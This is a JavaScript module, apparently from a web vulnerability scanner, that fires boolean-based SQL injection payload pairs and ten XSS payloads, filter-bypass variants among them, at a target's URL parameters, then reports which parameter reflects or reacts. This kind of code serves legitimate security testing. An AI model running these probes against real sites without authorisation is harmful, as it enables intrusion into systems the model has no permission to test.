const axios = require("axios");

const extractParams = (url) => {
    try {
        const u = new URL(url);
        const params = [];

        for (let [key, value] of u.searchParams.entries()) {
            params.push({ key, value });
        }

        return params;
    } catch {
        return [];
    }
};

// ----------------------
// SQLi ATTACK (BOOLEAN BASED)
// ----------------------
const runSQLi = async (target, links = []) => {

    const payloadPairs = [
    {
        truePayload: "' OR 1=1 --",
        falsePayload: "' AND 1=2 --"
    },
    {
        truePayload: "' OR '1'='1",
        falsePayload: "' AND '1'='2"
    },
    {
        truePayload: "\" OR \"1\"=\"1",
        falsePayload: "\" AND \"1\"=\"2"
    },
    {
        truePayload: "'/**/OR/**/1=1--",
        falsePayload: "'/**/AND/**/1=2--"
    },
    {
        truePayload: "' OR 1=1#",
        falsePayload: "' AND 1=2#"
    }
];

    let paths = [];

    for (let link of links) {
        if (link.includes("?")) {
            paths.push(link);
        }
    }

    paths = [...new Set(paths)];

    if (paths.length === 0) {
        paths = ["/?id="];
    }

    for (let path of paths) {

        let baseUrl = path.startsWith("http")
            ? path
            : `http://${target}${path.startsWith("/") ? "" : "/"}${path}`;

        console.log("BASE URL:", baseUrl);

        const params = extractParams(baseUrl);
        if (params.length === 0) continue;

        for (let pair of payloadPairs) {

            for (let param of params) {

                let trueUrl = new URL(baseUrl);
                let falseUrl = new URL(baseUrl);

                trueUrl.searchParams.set(param.key, param.value + pair.truePayload);
                falseUrl.searchParams.set(param.key, param.value + pair.falsePayload);

                console.log(`🧪 TRUE:`, trueUrl.toString());
                console.log(`🧪 FALSE:`, falseUrl.toString());

                try {
                    const trueRes = await axios.get(trueUrl.toString(), {
                        timeout: 10000,
                        validateStatus: () => true
                    });

                    const falseRes = await axios.get(falseUrl.toString(), {
                        timeout: 10000,
                        validateStatus: () => true
                    });

                    const trueBody = trueRes.data.toString();
                    const falseBody = falseRes.data.toString();

                    if (trueBody !== falseBody) {
                        return {
                            type: "sqli",
                            vulnerable: true,
                            technique: "boolean-based",
                            payload: pair.truePayload,
                            param: param.key,
                            target
                        };
                    }

                } catch (err) {
                    continue;
                }
            }
        }
    }

    return {
        type: "sqli",
        vulnerable: false,
        target
    };
};

// ----------------------
// XSS 
// ----------------------
const runXSS = async (target, links = []) => {

    const payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",

    // event-based
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",

    // filter bypass
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=confirm(1)>",

    // attribute injection
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",

    // encoded
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
];

    let paths = [];

    for (let link of links) {
        if (link.includes("?")) {
            paths.push(link);
        }
    }

    paths = [...new Set(paths)];

    if (paths.length === 0) {
        return {
            type: "xss",
            vulnerable: false,
            target
        };
    }

    for (let path of paths) {

        let baseUrl = path.startsWith("http")
            ? path
            : `http://${target}${path.startsWith("/") ? "" : "/"}${path}`;

        console.log("🌐 XSS BASE:", baseUrl);

        const params = extractParams(baseUrl);

        for (let param of params) {

            // ✅ THIS IS THE IMPORTANT PART (payload loop)
            for (let payload of payloads) {

                let testUrl = new URL(baseUrl);

                testUrl.searchParams.set(param.key, payload);

                const url = testUrl.toString();

                console.log(`🧪 XSS Testing [${param.key}]:`, url);

                // ----------------------
                // STORED XSS CHECK
                // ----------------------
                const MAX_VERIFY = 5;
                for (let verifyLink of links.slice(0,MAX_VERIFY)) {

                    try {
                        const verifyRes = await axios.get(verifyLink, {
                            timeout: 10000,
                            validateStatus: () => true
                        });

                        const verifyBody = verifyRes.data.toString().toLowerCase();

                        if (verifyBody.includes(payload.toLowerCase())) {
                            return {
                                type: "xss",
                                vulnerable: true,
                                payload,
                                param: param.key,
                                context: "stored",
                                target
                            };
                        }

                    } catch {
                        continue;
                    }
                }

                try {
                    const res = await axios.get(url, {
                        timeout: 10000,
                        validateStatus: () => true
                    });
                    const body = res.data.toString();
                    const normalizedBody = body.toLowerCase();
                    const lowerPayload = payload.toLowerCase();

                    const isRaw = normalizedBody.includes(lowerPayload);
                    const isEscaped =
                        normalizedBody.includes(payload.replace(/</g, "&lt;").toLowerCase()) ||
                        normalizedBody.includes(payload.replace(/>/g, "&gt;").toLowerCase());

                    // 🧠 CONTEXT DETECTION
                    let context = null;

                    if (isRaw) {

                        if (normalizedBody.includes(`<script`) && normalizedBody.includes(lowerPayload)) {
                            context = "script";
                        }

                        else if (
                            normalizedBody.includes(`="${lowerPayload}`) ||
                            normalizedBody.includes(`='${lowerPayload}`)
                        ) {
                            context = "attribute";
                        }

                        else if (normalizedBody.includes(lowerPayload)) {
                            context = "html";
                        }

                        else {
                            context = "unknown";
                        }
                    }
                

                    if (isRaw ) {
                        return {
                            type: "xss",
                            vulnerable: true,
                            payload,
                            param: param.key,
                            context: context || "unknown",
                            target
                        };
                    }
                }                 catch (err) {
                    continue;
                }
            }
        }
    }

    return {
        type: "xss",
        vulnerable: false,
        target
    };
};
                    
// ----------------------
// MAIN EXECUTOR
// ----------------------
const executeAttacks = async (actions, target, links = []) => {

    const promises = [];

    for (let act of actions) {
        if (act.type === "sqli") {
            promises.push(runSQLi(target, links));
        }

        if (act.type === "xss") {
            promises.push(runXSS(target, links));
        }
    }

    const results = await Promise.all(promises);

    return results;
};

module.exports = executeAttacks;